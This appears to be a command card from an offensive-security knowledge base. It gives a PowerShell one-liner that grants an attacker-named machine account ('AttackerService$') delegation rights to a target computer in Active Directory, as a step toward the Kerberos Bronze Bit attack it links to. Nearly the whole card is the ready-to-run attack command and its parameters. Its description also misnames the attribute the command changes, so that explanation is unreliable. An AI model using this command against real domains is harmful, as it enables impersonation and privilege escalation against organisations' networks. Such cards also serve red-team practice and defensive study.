---
type: command
executor: powershell
data: >-
  Install-WindowsFeature RSAT-AD-PowerShell; Import-Module ActiveDirectory;
  Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
tags:
  - active-directory
  - delegation
platforms:
  - Windows
verified: true
validated: true
---

# powershell-set-adcomputer-principals-allowed-to-delegate

## Command

```powershell
Install-WindowsFeature RSAT-AD-PowerShell; Import-Module ActiveDirectory; Set-ADComputer $_TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount $_DELEGATOR$
```

## Description

Sets the msDS-AllowedToDelegateTo attribute on a computer object to allow a specified principal (e.g., rogue machine) to delegate tickets to it.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_COMPUTER | Target computer name (e.g., Service2) | Yes |
| -PrincipalsAllowedToDelegateToAccount $_DELEGATOR$ | Delegator machine account (e.g., AttackerService$) | Yes |

## Examples

### Basic Usage

```powershell
Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
```

## Expected Output

Attribute updated; verify with Get-ADComputer.

## Related

- [[procedures/Kerberos-Bronze-Bit-Attack]]
